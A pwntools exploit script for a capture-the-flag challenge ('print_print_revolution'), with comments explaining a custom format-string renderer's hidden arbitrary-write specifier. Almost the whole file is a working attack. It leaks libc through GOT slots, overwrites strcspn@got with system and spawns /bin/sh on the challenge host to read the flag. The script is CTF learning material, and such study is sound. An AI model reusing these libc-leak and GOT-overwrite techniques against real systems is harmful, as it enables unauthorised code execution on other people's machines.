#!/usr/bin/env python3
# Sunshine CTF 2026 - Pwn/print_print_revolution
#
# The binary imports no printf; sub_401330 is a HAND-ROLLED format renderer, and
# alongside %x/%p/%s it implements an undocumented **%w**:
#
#     ptr = arg(N); val = arg(N+1); *ptr = val;        // "%N$w" -> prints "ok"
#
# That is a direct arbitrary 8-byte write -- no %n, no write-what-where synthesis.
# The template buffer is itself the vararg area (it starts at positional index 6,
# so index n reads buffer offset (n-6)*8), so both operands are attacker-chosen.
#
# No PIE and only Partial RELRO, so .got.plt is writable at a fixed address.
# %s on a GOT slot leaks the resolved libc pointer (6 bytes, then the null high
# bytes stop strlen), giving the libc base. Then one %w swaps strcspn@got for
# system -- and main's own `v5[strcspn(v5, "\n")] = 0` already calls it with
# rdi = our buffer, so the next line we send is executed as a command.
import sys, re
from pwn import *

context.update(arch='amd64', log_level='info')
HOST, PORT   = 'chal.sunshinectf.games', 26002
STRCSPN_GOT  = 0x404010                    # .got.plt slot, Partial RELRO -> writable
# strcspn's own resolved address has a null low byte, so %s cannot leak it. Nor
# can strlen/strcspn be used to resolve a base: glibc ifunc-dispatches them to
# SIMD variants, so the GOT holds __strlen_avx2 rather than the generic symbol.
# read and write are plain syscall wrappers, so they resolve honestly.
LEAK_SLOTS   = {'read': 0x404018, 'write': 0x404000}
BUF_ARG      = 8                           # positional index -> buffer offset 16
REMOTE_LIBC  = '/home/y_rose/ctf/sunshinectf_2026/Pwn/cache_money/libc.so.6'  # organizers ship Ubuntu GLIBC 2.39 elsewhere

remote_mode = len(sys.argv) > 1 and sys.argv[1] == 'remote'
io = remote(HOST, PORT) if remote_mode else process('../revolution')
io.recvuntil(b'score> ')

def template(payload):
    io.sendline(payload)
    return io.recvuntil(b'score> ', timeout=3, drop=True)

def pack(spec, *words):
    """spec occupies buffer[0:16] (args 6,7); words land at args 8,9,..."""
    return spec.ljust(16, b'.') + b''.join(p64(w) for w in words)

# 1 -- arbitrary read: %s dereferences a vararg, so point one at a GOT slot.
#      strlen stops at the null high bytes, so each leak yields the 6 real bytes.
libc = ELF(REMOTE_LIBC, checksec=False) if remote_mode else ELF('/usr/lib/libc.so.6', checksec=False)
bases = {}
for sym, slot in LEAK_SLOTS.items():
    raw = template(pack(f'%{BUF_ARG}$s'.encode(), slot)).split(b'.' * 10)[0]
    addr = u64(raw[:6].ljust(8, b'\x00'))
    bases[sym] = addr - libc.symbols[sym]
    log.info(f'libc {sym} @ {addr:#x}  ->  base {bases[sym]:#x}')

# 2 -- two independent slots must agree on a page-aligned base. That is the
#      libc-identity check: a wrong libc will disagree or land unaligned.
base = bases['read']
if len(set(bases.values())) != 1 or base & 0xfff:
    log.failure(f'libc mismatch: {[hex(b) for b in bases.values()]} -> wrong libc for this target')
    sys.exit(1)
libc.address = base
log.success(f'libc base   = {base:#x}')
log.success(f'system      = {libc.symbols["system"]:#x}')

# 3 -- one %w swaps the GOT slot for system().
r = template(pack(f'%{BUF_ARG}$w'.encode(), STRCSPN_GOT, libc.symbols['system']))
assert b'ok' in r, f'write did not report ok: {r[:40]!r}'
log.success('strcspn@got -> system')

# 4 -- main calls strcspn(v5, "\n") on every line, with rdi = the buffer itself.
io.sendline(b'/bin/sh')
io.recvrepeat(0.5)
io.sendline(b'cat flag*.txt flag* 2>/dev/null; ls')
out = io.recvrepeat(2).decode('latin1')
print(out)
m = re.search(r'sun\{[^}]*\}', out)
if m:
    log.success(f'FLAG: {m.group(0)}')
else:
    io.interactive()
